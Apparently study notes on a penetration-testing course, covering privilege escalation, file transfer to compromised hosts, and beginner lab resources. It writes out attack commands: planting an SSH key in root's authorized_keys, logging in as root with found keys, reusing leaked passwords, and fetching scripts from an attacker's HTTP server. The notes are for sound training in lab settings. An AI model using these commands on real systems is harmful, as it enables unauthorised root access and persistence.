##### **6.1. Sudo Privileges**
- **Overview:** The `sudo` command allows a user to execute commands as another user, often as root. Checking sudo privileges can reveal ways to escalate to root.
- **Command Example:**  
  - **Command:** `sudo -l`
  - **Example Output:**  
    ```
    User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
    ```

##### **6.2. SUID Privileges**
- **Overview:** SUID binaries allow certain commands to be executed with elevated privileges. These can be exploited to escalate privileges.

##### **6.3. Windows Token Privileges**
- **Overview:** In Windows, tokens can be exploited to elevate privileges to SYSTEM or administrator users.

#### **7. Scheduled Tasks**

##### **7.1. Overview**
- **Purpose:** Scheduled tasks or cron jobs in Linux and Windows can be exploited by adding malicious tasks or tricking them into executing malicious code.
- **Linux Cron Directories:**  
  - **/etc/crontab**  
  - **/etc/cron.d**  
  - **/var/spool/cron/crontabs/root**

#### **8. Exposed Credentials**

##### **8.1. Overview**
- **Purpose:** Configuration files, log files, and user history files often contain exposed credentials that can be used to escalate privileges or access other services.
- **Example Output:**    /var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
  ```

  ```

##### **8.2. Reusing Credentials**
- **Command Example:**  
  - **Command:** `su -`
  - **Example Output:**  
    ```
    Password: password123
    whoami
    root
    ```

#### **9. SSH Keys**

##### **9.1. Overview**
- **Purpose:** SSH private keys found in `.ssh/id_rsa` files can be used to log in to a system with elevated privileges.
- **Command Example:**  
  - **Command:** `chmod 600 id_rsa`
  - **Command:** `ssh root@10.10.10.10 -i id_rsa`

##### **9.2. Adding SSH Public Keys**
- **Purpose:** If we have write access to the `.ssh` directory, we can add our public key to the `authorized_keys` file to gain SSH access.
- **Command Example:**  
  - **Command:** `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
  - **Command:** `ssh root@10.10.10.10 -i key`

#### **10. Privilege Escalation Methods**
- **Linux:** Explore kernel exploits, vulnerable software, user privileges, cron jobs, exposed credentials, and SSH keys.
- **Windows:** Explore kernel exploits, vulnerable software, token privileges, scheduled tasks, exposed credentials, and SSH keys.
## Transferring Files
#### **1. Transferring Files**

##### **1.1. Overview**
- **Purpose:** During penetration testing, it is often necessary to transfer files, such as enumeration scripts or exploits, to the remote server or transfer data back to the attack host. While tools like Metasploit with a Meterpreter shell offer an Upload command, it is crucial to understand methods for transferring files using a standard reverse shell.

#### **2. Using wget**

##### **2.1. Overview**
- **Purpose:** A common method to transfer files is by running a Python HTTP server on the attacker's machine and using `wget` or `cURL` to download the file on the remote host.
- **Steps:**
  1. Start a Python HTTP server on the attacker's machine in the directory containing the file to transfer:
    - **Command Example:**        python3 -m http.server 8000
      ```

      ```
  2. Download the file on the remote host using `wget`:
    - **Command Example:**       user@remotehost$ wget http ://10.10.14.1:8000/linenum.sh
      ```

      ```

##### **2.2. Using cURL**
- **Overview:** If the remote server does not have `wget`, use `cURL` to download the file.
- **Command Example:**
  - **Command Example:**     user@remotehost$ curl 'http ://10.10.14.1:8000/linenum.sh' -o linenum.sh
    ```

    ```

#### **3. Using SCP**

##### **3.1. Overview**
- **Purpose:** `scp` can be used to transfer files when SSH user credentials on the remote host have been obtained.
- **Command Example:** 
  - **Command Example:**   scp linenum.sh user@remotehost:/tmp/linenum.sh
    ```

    ```

#### **4. Using Base64**

##### **4.1. Overview**
- **Purpose:** In situations where file transfer is blocked by firewall protections, base64 encoding can be used to transfer files. The file is encoded into a base64 string, transferred, and then decoded on the remote host.
- **Steps:**
  1. Base64 encode the file:
    - **Command Example:**       base64 shell -w 0
      ```

      ```
  2. Decode the base64 string on the remote host and pipe the output into a file:
    - **Command Example:**       user@remotehost$ echo <base64_string> | base64 -d > shell
      ```

      ```

#### **5. Validating File Transfers**

##### **5.1. Overview**
- **Purpose:** To ensure that the file transfer was successful and that the file is intact.
- **Steps:**
  1. Run the `file` command to check the file format:
    - **Command Example:**       user@remotehost$ file shell
      ```

      ```
  2. Verify the file's integrity by checking the MD5 hash on both the local and remote systems:
    - **Command Example (Local):**       M0n0l1th6@htb[/htb]$ md5sum shell
      ```

      ```
    - **Command Example (Remote):**       user@remotehost$ md5sum shell
      ```

      ```
## Starting Out
#### **1. Starting Out**

##### **1.1. Overview**
- **Purpose:** As a beginner in information security, starting can be daunting due to the vast amount of resources and knowledge required. This section outlines the different approaches to learning and provides guidance on how to navigate the initial stages of your journey.

##### **1.2. Learning Approaches**
- **Guided Learning:**
  - **Description:** HTB Academy follows a guided learning approach where students work through modules on specific subjects, reinforcing knowledge through hands-on exercises and assessments.
- **Exploratory Learning:**
  - **Description:** The main HTB platform offers an exploratory learning approach, placing users in real-world scenarios where they must use their skills to achieve goals. This approach helps build methodologies and techniques for penetration testing.

##### **1.3. Mixing Learning Styles**
- **Purpose:** Combining guided and exploratory learning allows for structured skill-building while deepening understanding through practical challenges.

#### **2. Resources**

##### **2.1. Vulnerable Machines/Applications**
- **Overview:** Practicing with purposefully vulnerable machines and web applications in a safe environment is crucial for skill development.
- **Examples:**
  - **OWASP Juice Shop:** A modern vulnerable web application showcasing the OWASP Top Ten and other real-world application security flaws.
  - **Metasploitable 2:** A vulnerable Ubuntu Linux VM for practicing enumeration, automated, and manual exploitation.
  - **Metasploitable 3:** A template for building a vulnerable Windows VM with a wide range of vulnerabilities.
  - **DVWA:** A vulnerable PHP/MySQL web application with varying difficulty levels for common web application vulnerabilities.

##### **2.2. YouTube Channels**
- **Purpose:** Several YouTube channels provide valuable insights and walkthroughs on penetration testing techniques.
- **Examples:**
  - **IppSec:** In-depth walkthroughs of retired HTB boxes and various techniques.
  - **VbScrub:** Focuses on Active Directory exploitation and HTB videos.
  - **STÖK:** Covers infosec topics, mainly focusing on bug bounties and web application penetration testing.
  - **LiveOverflow:** Offers videos on a wide range of technical infosec topics.

##### **2.3. Blogs**
- **Purpose:** Blogs are excellent for gaining different perspectives and in-depth knowledge on various topics.
- **Example:**
  - **0xdf hacks stuff:** A blog with walkthroughs of retired HTB boxes, including "Beyond Root" sections for additional insights.

##### **2.4. Tutorial Websites**
- **Purpose:** Tutorial websites help practice fundamental IT skills, such as scripting and command line usage.
- **Examples:**
  - **Under The Wire:** Trains users on Windows PowerShell through various challenges.
  - **Over The Wire:** Focuses on Linux command line and Bash scripting in a "war games" format.

#### **3. HTB-Specific Resources**

##### **3.1. HTB Starting Point**
- **Purpose:** Introduction to HTB labs and basic machines/challenges. It includes tutorials on connecting to VPN, enumeration, gaining footholds, and privilege escalation against a single target.

##### **3.2. HTB Tracks**
- **Purpose:** Tracks are selections of machines and challenges tied together to help users progress through a particular subject, following an exploratory learning approach.

##### **3.3. Beginner-Friendly HTB Machines**
- **Examples:**
  - **Lame**
  - **Blue**
  - **Nibbles**
  - **Shocker**
  - **Jerry**

##### **3.4. Beginner-Friendly HTB Challenges**
- **Examples:**
  - **Find The Easy Pass**
  - **Weak RSA**
  - **You know 0xDiablos**

##### **3.5. Dante Prolab**
- **Overview:** A beginner-friendly Pro Lab on the HTB platform, geared towards players with some experience in network and web application attacks, and understanding of penetration methodologies such as scanning/enumeration, lateral movement, privilege escalation, and post-exploitation.

#### **4. Moving On**

##### **4.1. Next Steps**
- **Overview:** After covering basic terminology, techniques, scanning, and enumeration, the next step is to put the pieces together by walking through an easy-rated HTB box step-by-step.

